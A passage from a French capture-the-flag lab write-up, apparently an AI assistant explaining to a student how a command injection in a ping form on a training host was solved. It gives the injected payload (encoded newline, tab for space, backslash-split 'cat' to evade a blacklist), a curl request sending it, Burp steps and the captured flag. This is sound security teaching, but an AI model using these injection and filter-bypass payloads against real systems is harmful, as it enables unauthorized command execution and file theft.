2. Le fond du problème

Le serveur faisait probablement quelque chose comme :

ping -c 1 <valeur_de_domain>

Le bug, c’est qu’il prenait ta valeur utilisateur et la passait au shell sans sécurisation correcte.

Quand tu as envoyé :

127.0.0.1%0Ac\at%09/etc/1-flag.txt

le shell a fini par interpréter cela comme :

ping -c 1 127.0.0.1
cat /etc/1-flag.txt

Donc :

la première ligne exécute le ping normal
la deuxième ligne lit le fichier du flag

C’est exactement le principe de la command injection.

3. Pourquoi ton payload a marché

Ton payload était :

domain=127.0.0.1%0Ac\at%09/etc/1-flag.txt

Décomposition :

127.0.0.1

C’est une entrée valide pour le ping.
Tu donnes donc au filtre quelque chose d’acceptable au départ.

%0A

C’est un retour à la ligne encodé en URL.
Il sert à séparer les commandes.

Donc tu ne restes plus dans :

ping -c 1 127.0.0.1

mais tu passes à :

ping -c 1 127.0.0.1
...
c\at

C’est ton bypass de la blacklist sur cat.

Le filtre voit une chaîne qui n’est pas exactement cat, donc il laisse parfois passer.
Mais le shell, lui, recompose correctement :

c\at  ->  cat
%09

C’est une tabulation encodée.
Tu l’as utilisée pour contourner le blocage de l’espace.

Donc au lieu de :

cat /etc/1-flag.txt

tu as écrit l’équivalent shell de :

cat<TAB>/etc/1-flag.txt

Et pour le shell, tabulation et espace peuvent jouer le même rôle de séparateur.

/etc/1-flag.txt

C’est le fichier cible à lire.

4. Comment tu as résolu la tâche avec Burp
Étape 1 — Intercepter la requête normale

Tu es allé sur l’application, tu as utilisé le champ ping, puis Burp a intercepté une requête de ce type :

POST /discover HTTP/1.1
Host: web0x09.hbtn
Content-Type: application/x-www-form-urlencoded

domain=127.0.0.1

Ça t’a permis d’identifier :

le bon host : web0x09.hbtn
le bon endpoint : /discover
le bon paramètre vulnérable : domain
Étape 2 — Envoyer dans Repeater

Tu as envoyé cette requête vers Burp Repeater pour la rejouer et la modifier facilement.

Étape 3 — Remplacer le body par le payload injecté

Dans Repeater, tu as modifié le body pour mettre :

domain=127.0.0.1%0Ac\at%09/etc/1-flag.txt
Étape 4 — Envoyer la requête

En cliquant sur Send, le serveur a exécuté :

le ping normal
puis la commande injectée
Étape 5 — Lire la réponse

La réponse HTTP t’a montré dans le <pre> :

le résultat du ping
puis le contenu du fichier

Tu as vu :

FLAG_1 d491e118fbb65eb967df6b68571c18af

Donc la tâche était résolue.

5. Comment tu as résolu la tâche avec curl

Avec curl, tu as fait exactement la même attaque, mais sans Burp.

La logique :

curl envoie une requête POST
le body contient ton paramètre domain
tu y mets directement ton payload encodé

Exemple correspondant à ta résolution :

curl -s -X POST http://web0x09.hbtn/discover \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'domain=127.0.0.1%0Ac\at%09/etc/1-flag.txt'
Ce que fait cette commande
-s : mode silencieux
-X POST : méthode POST
-H 'Content-Type: application/x-www-form-urlencoded' : format attendu par le formulaire
--data '...' : envoie le paramètre domain avec le payload
Pourquoi c’est utile

curl est pratique parce que :

tu contrôles précisément le body
tu évites certains pièges d’encodage de l’interface Burp
tu peux automatiser ou rejouer rapidement les tests
6. Résumé ultra simple de ta résolution

Tu as résolu la tâche 1 en exploitant une command injection dans le champ ping.

Tu as :

trouvé la bonne requête : POST /discover
repéré le paramètre vulnérable : domain
injecté une seconde commande avec %0A
contourné le filtre espace avec %09
contourné le filtre sur cat avec c\at
lu le fichier /etc/1-flag.txt

Payload final :

domain=127.0.0.1%0Ac\at%09/etc/1-flag.txt
7. Ce que tu peux dire à l’oral

Tu peux l’expliquer comme ça :

Dans la tâche 1, le champ ping était toujours vulnérable à la command injection, mais l’application ajoutait un filtrage sur les espaces et sur certaines commandes comme cat.
J’ai intercepté la requête dans Burp et identifié que le paramètre contrôlé était domain, envoyé à /discover.
J’ai ensuite utilisé %0A pour injecter une nouvelle commande après le ping, %09 pour remplacer l’espace, et c\at pour contourner une blacklist simple sur la commande cat.
Le payload final a permis au shell d’exécuter l’équivalent de cat /etc/1-flag.txt, ce qui a révélé le flag dans la réponse HTTP.

8. Ce que cette tâche t’a appris

Elle t’a appris à reconnaître trois choses très importantes :

une faille peut rester exploitable même après un “patch”
bloquer seulement les espaces ou certains mots-clés ne suffit pas
le shell accepte d’autres séparateurs et peut reconstruire des commandes obfusquées

Autrement dit :

la blacklist seule est une mauvaise défense contre la command injection.

Si tu veux, je peux maintenant te faire le write-up complet de la tâche 1 au format README, exactement comme un compte-rendu de pentest de lab.
